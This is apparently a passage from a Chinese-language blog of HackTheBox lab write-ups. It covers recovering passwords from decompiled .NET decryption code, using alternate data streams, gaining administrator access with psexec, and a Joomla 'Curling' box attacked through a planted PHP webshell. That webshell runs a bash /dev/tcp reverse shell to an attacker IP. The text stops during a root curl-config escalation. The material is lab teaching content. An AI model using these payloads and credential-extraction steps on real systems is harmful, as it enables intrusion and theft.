</span></span></span><span class=line><span class=cl><span class=c></span><span class=k>Public</span> <span class=k>Shared</span> <span class=k>Function</span> <span class=nf>DecryptString</span><span class=p>(</span><span class=n>EncryptedString</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>)</span> <span class=ow>As</span> <span class=kt>String</span>
</span></span><span class=line><span class=cl>    <span class=k>If</span> <span class=kt>String</span><span class=p>.</span><span class=n>IsNullOrEmpty</span><span class=p>(</span><span class=n>EncryptedString</span><span class=p>)</span> <span class=k>Then</span>
</span></span><span class=line><span class=cl>        <span class=k>Return</span> <span class=kt>String</span><span class=p>.</span><span class=n>Empty</span>
</span></span><span class=line><span class=cl>    <span class=k>Else</span>
</span></span><span class=line><span class=cl>        <span class=k>Return</span> <span class=n>Decrypt</span><span class=p>(</span><span class=n>EncryptedString</span><span class=p>,</span> <span class=s>&#34;N3st22&#34;</span><span class=p>,</span> <span class=s>&#34;88552299&#34;</span><span class=p>,</span> <span class=n>2</span><span class=p>,</span> <span class=s>&#34;464R5DFA5DL6LE28&#34;</span><span class=p>,</span> <span class=n>256</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>End</span> <span class=k>If</span>
</span></span><span class=line><span class=cl><span class=k>End</span> <span class=k>Function</span>
</span></span><span class=line><span class=cl><span class=c>&#39; code snippets...
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl><span class=k>Public</span> <span class=k>Shared</span> <span class=k>Function</span> <span class=nf>Decrypt</span><span class=p>(</span><span class=k>ByVal</span> <span class=n>cipherText</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
</span></span><span class=line><span class=cl>                               <span class=k>ByVal</span> <span class=n>passPhrase</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
</span></span><span class=line><span class=cl>                               <span class=k>ByVal</span> <span class=n>saltValue</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
</span></span><span class=line><span class=cl>                                <span class=k>ByVal</span> <span class=n>passwordIterations</span> <span class=ow>As</span> <span class=kt>Integer</span><span class=p>,</span> _
</span></span><span class=line><span class=cl>                               <span class=k>ByVal</span> <span class=n>initVector</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
</span></span><span class=line><span class=cl>                               <span class=k>ByVal</span> <span class=n>keySize</span> <span class=ow>As</span> <span class=kt>Integer</span><span class=p>)</span> _
</span></span><span class=line><span class=cl>                       <span class=ow>As</span> <span class=kt>String</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>Dim</span> <span class=n>initVectorBytes</span> <span class=ow>As</span> <span class=kt>Byte</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>initVectorBytes</span> <span class=o>=</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>ASCII</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=n>initVector</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>Dim</span> <span class=n>saltValueBytes</span> <span class=ow>As</span> <span class=kt>Byte</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>saltValueBytes</span> <span class=o>=</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>ASCII</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=n>saltValue</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>Dim</span> <span class=n>cipherTextBytes</span> <span class=ow>As</span> <span class=kt>Byte</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>cipherTextBytes</span> <span class=o>=</span> <span class=n>Convert</span><span class=p>.</span><span class=n>FromBase64String</span><span class=p>(</span><span class=n>cipherText</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>Dim</span> <span class=n>password</span> <span class=ow>As</span> <span class=k>New</span> <span class=n>Rfc2898DeriveBytes</span><span class=p>(</span><span class=n>passPhrase</span><span class=p>,</span> _
</span></span><span class=line><span class=cl>                                       <span class=n>saltValueBytes</span><span class=p>,</span> _
</span></span><span class=line><span class=cl>                                       <span class=n>passwordIterations</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>Dim</span> <span class=n>keyBytes</span> <span class=ow>As</span> <span class=kt>Byte</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>keyBytes</span> <span class=o>=</span> <span class=n>password</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=k>CInt</span><span class=p>(</span><span class=n>keySize</span> <span class=o>/</span> <span class=n>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>Dim</span> <span class=n>symmetricKey</span> <span class=ow>As</span> <span class=k>New</span> <span class=n>AesCryptoServiceProvider</span>
</span></span><span class=line><span class=cl>    <span class=n>symmetricKey</span><span class=p>.</span><span class=n>Mode</span> <span class=o>=</span> <span class=n>CipherMode</span><span class=p>.</span><span class=n>CBC</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>Dim</span> <span class=n>decryptor</span> <span class=ow>As</span> <span class=n>ICryptoTransform</span>
</span></span><span class=line><span class=cl>    <span class=n>decryptor</span> <span class=o>=</span> <span class=n>symmetricKey</span><span class=p>.</span><span class=n>CreateDecryptor</span><span class=p>(</span><span class=n>keyBytes</span><span class=p>,</span> <span class=n>initVectorBytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>Dim</span> <span class=n>memoryStream</span> <span class=ow>As</span> <span class=n>IO</span><span class=p>.</span><span class=n>MemoryStream</span>
</span></span><span class=line><span class=cl>    <span class=n>memoryStream</span> <span class=o>=</span> <span class=k>New</span> <span class=n>IO</span><span class=p>.</span><span class=n>MemoryStream</span><span class=p>(</span><span class=n>cipherTextBytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>Dim</span> <span class=n>cryptoStream</span> <span class=ow>As</span> <span class=n>CryptoStream</span>
</span></span><span class=line><span class=cl>    <span class=n>cryptoStream</span> <span class=o>=</span> <span class=k>New</span> <span class=n>CryptoStream</span><span class=p>(</span><span class=n>memoryStream</span><span class=p>,</span> _
</span></span><span class=line><span class=cl>                                    <span class=n>decryptor</span><span class=p>,</span> _
</span></span><span class=line><span class=cl>                                    <span class=n>CryptoStreamMode</span><span class=p>.</span><span class=n>Read</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>Dim</span> <span class=n>plainTextBytes</span> <span class=ow>As</span> <span class=kt>Byte</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>ReDim</span> <span class=n>plainTextBytes</span><span class=p>(</span><span class=n>cipherTextBytes</span><span class=p>.</span><span class=n>Length</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>Dim</span> <span class=n>decryptedByteCount</span> <span class=ow>As</span> <span class=kt>Integer</span>
</span></span><span class=line><span class=cl>    <span class=n>decryptedByteCount</span> <span class=o>=</span> <span class=n>cryptoStream</span><span class=p>.</span><span class=n>Read</span><span class=p>(</span><span class=n>plainTextBytes</span><span class=p>,</span> _
</span></span><span class=line><span class=cl>                                           <span class=n>0</span><span class=p>,</span> _
</span></span><span class=line><span class=cl>                                           <span class=n>plainTextBytes</span><span class=p>.</span><span class=n>Length</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>memoryStream</span><span class=p>.</span><span class=n>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>cryptoStream</span><span class=p>.</span><span class=n>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>Dim</span> <span class=n>plainText</span> <span class=ow>As</span> <span class=kt>String</span>
</span></span><span class=line><span class=cl>    <span class=n>plainText</span> <span class=o>=</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>ASCII</span><span class=p>.</span><span class=n>GetString</span><span class=p>(</span><span class=n>plainTextBytes</span><span class=p>,</span> _
</span></span><span class=line><span class=cl>                                        <span class=n>0</span><span class=p>,</span> _
</span></span><span class=line><span class=cl>                                        <span class=n>decryptedByteCount</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>    <span class=k>Return</span> <span class=n>plainText</span>
</span></span><span class=line><span class=cl><span class=k>End</span> <span class=k>Function</span>
</span></span></code></pre></td></tr></table></div></div><p>根据 <a href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.rfc2898derivebytes?view=net-6.0" target=_blank rel="noopener noreffer">.NET doc</a> 的结果，这个函数的流程其实很简单：</p><ol><li>用 HMAC-SHA1 经过 <code>passwordIterations</code> 轮 PBKDF2 从 <code>passPhrase</code> 计算出长度为 <code>keySize/8</code> 的 key</li><li>用上一步求出来的 <code>key</code> 和传入的 <code>initVectors</code> 经过 AES-CBC 模式解密 base64 解码后的 <code>cipherText</code>q</li></ol><p>那很容易就能用写个脚本解密：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>pbkdf2_hmac</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>base64</span> <span class=kn>import</span> <span class=n>b64decode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>cipherText</span><span class=p>,</span> <span class=n>passphrase</span><span class=p>,</span> <span class=n>salt</span><span class=p>,</span> <span class=nb>iter</span><span class=p>,</span> <span class=n>iv</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>dk</span> <span class=o>=</span> <span class=n>pbkdf2_hmac</span><span class=p>(</span><span class=s1>&#39;sha1&#39;</span><span class=p>,</span> <span class=n>passphrase</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>salt</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=nb>iter</span><span class=p>,</span> <span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>aes</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>dk</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>aes</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>b64decode</span><span class=p>(</span><span class=n>cipherText</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>=</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>decrypt</span><span class=p>(</span><span class=s2>&#34;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&#34;</span><span class=p>,</span> <span class=s2>&#34;N3st22&#34;</span><span class=p>,</span> <span class=s2>&#34;88552299&#34;</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=s2>&#34;464R5DFA5DL6LE28&#34;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>得到密码为 <code>xRxRxPANCAK3SxRxRx</code>。</p><h3 id=foothold-2>Foothold</h3><p>查看 <code>Data/IT/Configs/RU Scanner/RU_config.xml</code>，对应的用户名是 c.smith，用这组 credential 重新枚举一下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>smbmap -H <span class=nv>$target</span> -u c.smith -p xRxRxPANCAK3SxRxRx -R Users
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647368984_67655149.png title=https://assets.lxdlam.com/img/1647368984_67655149.png data-thumbnail=https://assets.lxdlam.com/img/1647368984_67655149.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647368984_67655149.png data-srcset="https://assets.lxdlam.com/img/1647368984_67655149.png, https://assets.lxdlam.com/img/1647368984_67655149.png 1.5x, https://assets.lxdlam.com/img/1647368984_67655149.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647368984_67655149.png width=100%></a><p>挂载上去，拿到 user flag。</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647369172_1c38b17d.png title=https://assets.lxdlam.com/img/1647369172_1c38b17d.png data-thumbnail=https://assets.lxdlam.com/img/1647369172_1c38b17d.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647369172_1c38b17d.png data-srcset="https://assets.lxdlam.com/img/1647369172_1c38b17d.png, https://assets.lxdlam.com/img/1647369172_1c38b17d.png 1.5x, https://assets.lxdlam.com/img/1647369172_1c38b17d.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647369172_1c38b17d.png width=100%></a><h3 id=privilege-escalation-2>Privilege Escalation</h3><p>看看剩下的东西，发现有个 <code>Debug Mode Password.txt</code>，但是是空的，比较奇怪。用 <code>smbclient</code> 看一下：</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647369410_3a5a1389.png title=https://assets.lxdlam.com/img/1647369410_3a5a1389.png data-thumbnail=https://assets.lxdlam.com/img/1647369410_3a5a1389.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647369410_3a5a1389.png data-srcset="https://assets.lxdlam.com/img/1647369410_3a5a1389.png, https://assets.lxdlam.com/img/1647369410_3a5a1389.png 1.5x, https://assets.lxdlam.com/img/1647369410_3a5a1389.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647369410_3a5a1389.png width=100%></a><p>发现有 NTFS Alternative Data Stream。用对应语法把文件拉下来：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>smb</span><span class=err>:</span> <span class=p>\</span><span class=n>C</span><span class=p>.</span><span class=n>Smith</span><span class=p>\</span><span class=n>HQK</span> <span class=n>Reporting</span><span class=p>\&gt;</span> <span class=n>get</span> <span class=s2>&#34;Debug Mode Password.txt:Password&#34;</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647369566_f3f621e7.png title=https://assets.lxdlam.com/img/1647369566_f3f621e7.png data-thumbnail=https://assets.lxdlam.com/img/1647369566_f3f621e7.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647369566_f3f621e7.png data-srcset="https://assets.lxdlam.com/img/1647369566_f3f621e7.png, https://assets.lxdlam.com/img/1647369566_f3f621e7.png 1.5x, https://assets.lxdlam.com/img/1647369566_f3f621e7.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647369566_f3f621e7.png width=100%></a><p>得到密码为 <code>WBQ201953D8w</code>。根据 nmap 的结果，我们现在尝试用 telnet 访问这个 <em>HQK Reporting</em> 服务。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>telnet <span class=nv>$target</span> <span class=m>4386</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647369678_db6349ed.png title=https://assets.lxdlam.com/img/1647369678_db6349ed.png data-thumbnail=https://assets.lxdlam.com/img/1647369678_db6349ed.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647369678_db6349ed.png data-srcset="https://assets.lxdlam.com/img/1647369678_db6349ed.png, https://assets.lxdlam.com/img/1647369678_db6349ed.png 1.5x, https://assets.lxdlam.com/img/1647369678_db6349ed.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647369678_db6349ed.png width=100%></a><p>在里面探索了一会儿，最终在 <code>../LDAP</code> 里面发现了一个 <code>Ldap.conf</code>，其中有 Administrator 的密码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
</span></span></code></pre></td></tr></table></div></div><p>之前的 smb 枚举结果里面还有一个 <code>HqkLdap.exe</code>，拉下来拖进 IDA Pro 或者 <a href=https://github.com/horsicq/Detect-It-Easy target=_blank rel="noopener noreffer">Detect It Easy</a> 之类的工具里面，发现是 .NET 的 binary，拿 <a href=https://github.com/dnSpy/dnSpy target=_blank rel="noopener noreffer">dnSpy</a> 反编译然后审计一下。</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647370738_188c5525.png title=https://assets.lxdlam.com/img/1647370738_188c5525.png data-thumbnail=https://assets.lxdlam.com/img/1647370738_188c5525.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647370738_188c5525.png data-srcset="https://assets.lxdlam.com/img/1647370738_188c5525.png, https://assets.lxdlam.com/img/1647370738_188c5525.png 1.5x, https://assets.lxdlam.com/img/1647370738_188c5525.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647370738_188c5525.png width=100%></a>
<a class=lightgallery href=https://assets.lxdlam.com/img/1647370201_938423bd.png title=https://assets.lxdlam.com/img/1647370201_938423bd.png data-thumbnail=https://assets.lxdlam.com/img/1647370201_938423bd.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647370201_938423bd.png data-srcset="https://assets.lxdlam.com/img/1647370201_938423bd.png, https://assets.lxdlam.com/img/1647370201_938423bd.png 1.5x, https://assets.lxdlam.com/img/1647370201_938423bd.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647370201_938423bd.png width=100%></a><p>发现整个流程跟上面是一样的，就是换了个参数，直接拿来用，得到密码为 <code>XtH4nkS4Pl4y1nGX</code>。</p><p>用 <a href=https://github.com/SecureAuthCorp/impacket target=_blank rel="noopener noreffer">impacket</a> 的 <code>psexec.py</code> 直接打进去：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 psexec.py administrator:XtH4nkS4Pl4y1nGX@<span class=nv>$target</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647370458_2909fb2d.png title=https://assets.lxdlam.com/img/1647370458_2909fb2d.png data-thumbnail=https://assets.lxdlam.com/img/1647370458_2909fb2d.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647370458_2909fb2d.png data-srcset="https://assets.lxdlam.com/img/1647370458_2909fb2d.png, https://assets.lxdlam.com/img/1647370458_2909fb2d.png 1.5x, https://assets.lxdlam.com/img/1647370458_2909fb2d.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647370458_2909fb2d.png width=100%></a><p>拿到 root flag。</p><h2 id=curling>Curling</h2><h3 id=enumeration-3>Enumeration</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>ports</span><span class=o>=</span><span class=k>$(</span>nmap -p- --min-rate<span class=o>=</span><span class=m>1000</span> -T4 <span class=nv>$target</span> <span class=p>|</span> grep ^<span class=o>[</span>0-9<span class=o>]</span> <span class=p>|</span> cut -d <span class=s1>&#39;/&#39;</span> -f <span class=m>1</span> <span class=p>|</span> tr <span class=s1>&#39;\n&#39;</span> <span class=s1>&#39;,&#39;</span> <span class=p>|</span> sed s/,$//<span class=k>)</span>
</span></span><span class=line><span class=cl>nmap -p <span class=nv>$ports</span> -sCV <span class=nv>$target</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647371174_b5991e67.png title=https://assets.lxdlam.com/img/1647371174_b5991e67.png data-thumbnail=https://assets.lxdlam.com/img/1647371174_b5991e67.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647371174_b5991e67.png data-srcset="https://assets.lxdlam.com/img/1647371174_b5991e67.png, https://assets.lxdlam.com/img/1647371174_b5991e67.png 1.5x, https://assets.lxdlam.com/img/1647371174_b5991e67.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647371174_b5991e67.png width=100%></a><p>惯例看看 80 上是什么。</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647371206_c1381821.png title=https://assets.lxdlam.com/img/1647371206_c1381821.png data-thumbnail=https://assets.lxdlam.com/img/1647371206_c1381821.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647371206_c1381821.png data-srcset="https://assets.lxdlam.com/img/1647371206_c1381821.png, https://assets.lxdlam.com/img/1647371206_c1381821.png 1.5x, https://assets.lxdlam.com/img/1647371206_c1381821.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647371206_c1381821.png width=100%></a><p>发现是 Joomla CMS，根据 <a href=https://hackertarget.com/attacking-enumerating-joomla/ target=_blank rel="noopener noreffer">HackTarget</a> 的顺序先找到 Joomla 的版本是 3.8.8，找直接的 exploit 无功而返。</p><p>审计一下源代码，最下面有个挺有意思的注释：</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647371346_8ed7bf35.png title=https://assets.lxdlam.com/img/1647371346_8ed7bf35.png data-thumbnail=https://assets.lxdlam.com/img/1647371346_8ed7bf35.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647371346_8ed7bf35.png data-srcset="https://assets.lxdlam.com/img/1647371346_8ed7bf35.png, https://assets.lxdlam.com/img/1647371346_8ed7bf35.png 1.5x, https://assets.lxdlam.com/img/1647371346_8ed7bf35.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647371346_8ed7bf35.png width=100%></a><p>尝试用 LFI 搞到这个文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl http://<span class=nv>$target</span>/secrets.txt
</span></span><span class=line><span class=cl><span class=c1># Q3VybGluZzIwMTgh</span>
</span></span></code></pre></td></tr></table></div></div><p>惯例拖进 <a href=https://gchq.github.io/CyberChef/ target=_blank rel="noopener noreffer">CyberChef</a>，base58 解一下得到 <code>Curling2018!</code>。根据网站上的作者 <code>floris</code>，用这组 credential 成功登进后台。</p><h3 id=foothold-3>Foothold</h3><p>稍微调查了一下，发现 joomla 的模板可以随便改：</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647372049_e3f99f23.png title=https://assets.lxdlam.com/img/1647372049_e3f99f23.png data-thumbnail=https://assets.lxdlam.com/img/1647372049_e3f99f23.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647372049_e3f99f23.png data-srcset="https://assets.lxdlam.com/img/1647372049_e3f99f23.png, https://assets.lxdlam.com/img/1647372049_e3f99f23.png 1.5x, https://assets.lxdlam.com/img/1647372049_e3f99f23.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647372049_e3f99f23.png width=100%></a>
<a class=lightgallery href=https://assets.lxdlam.com/img/1647372068_e478ca68.png title=https://assets.lxdlam.com/img/1647372068_e478ca68.png data-thumbnail=https://assets.lxdlam.com/img/1647372068_e478ca68.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647372068_e478ca68.png data-srcset="https://assets.lxdlam.com/img/1647372068_e478ca68.png, https://assets.lxdlam.com/img/1647372068_e478ca68.png 1.5x, https://assets.lxdlam.com/img/1647372068_e478ca68.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647372068_e478ca68.png width=100%></a><p>直接搞了个简单的 webshell 上去：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>  <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;bash -c &#39;bash -e &amp;&gt; /dev/tcp/&lt;ip&gt;/1234 &lt;&amp; 1&#39;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>之后直接访问就能接到 shell。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://10.10.10.150/templates/protostar/pwned.php
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647372186_552c0901.png title=https://assets.lxdlam.com/img/1647372186_552c0901.png data-thumbnail=https://assets.lxdlam.com/img/1647372186_552c0901.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647372186_552c0901.png data-srcset="https://assets.lxdlam.com/img/1647372186_552c0901.png, https://assets.lxdlam.com/img/1647372186_552c0901.png 1.5x, https://assets.lxdlam.com/img/1647372186_552c0901.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647372186_552c0901.png width=100%></a><h3 id=lateral-movement-1>Lateral Movement</h3><p><code>ls -al /home</code> 看了一下，可以读 floris 的 home，直接进去看看，里面有个 password_backup：</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647372410_d3ab48af.png title=https://assets.lxdlam.com/img/1647372410_d3ab48af.png data-thumbnail=https://assets.lxdlam.com/img/1647372410_d3ab48af.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647372410_d3ab48af.png data-srcset="https://assets.lxdlam.com/img/1647372410_d3ab48af.png, https://assets.lxdlam.com/img/1647372410_d3ab48af.png 1.5x, https://assets.lxdlam.com/img/1647372410_d3ab48af.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647372410_d3ab48af.png width=100%></a><p>拉到本地 <code>xxd -r</code> 一下，<code>file</code> 一下发现是 bzip2 的压缩包，解开之后继续 <code>file</code> 一下发现是 gzip 压缩包，重复几轮到最后拿到密码 <code>5d&lt;wdCbdZu)|hChXll</code>。用这个密码进 ssh，拿到用户 flag。</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647372559_7ed6e4c7.png title=https://assets.lxdlam.com/img/1647372559_7ed6e4c7.png data-thumbnail=https://assets.lxdlam.com/img/1647372559_7ed6e4c7.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647372559_7ed6e4c7.png data-srcset="https://assets.lxdlam.com/img/1647372559_7ed6e4c7.png, https://assets.lxdlam.com/img/1647372559_7ed6e4c7.png 1.5x, https://assets.lxdlam.com/img/1647372559_7ed6e4c7.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647372559_7ed6e4c7.png width=100%></a><h3 id=privilege-escalation-3>Privilege Escalation</h3><p><code>ls -al</code> 一下 home，发现一个很有意思的文件夹，owner 是 <code>root</code>，但是 <code>floris</code> group 是有权限的。这意味着应该有个 root 权限跑的东西会读写这个文件。<code>lsof</code> 一下，什么结果都没有，试试用 pspy 枚举一下定时任务：</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647373111_eb5b1508.png title=https://assets.lxdlam.com/img/1647373111_eb5b1508.png data-thumbnail=https://assets.lxdlam.com/img/1647373111_eb5b1508.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647373111_eb5b1508.png data-srcset="https://assets.lxdlam.com/img/1647373111_eb5b1508.png, https://assets.lxdlam.com/img/1647373111_eb5b1508.png 1.5x, https://assets.lxdlam.com/img/1647373111_eb5b1508.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647373111_eb5b1508.png width=100%></a><p>发现这个 <code>input</code> 是 curl 的配置文件。因为用 root 运行的，对系统有完全的读写权限，我们直接给他弄个 crontab 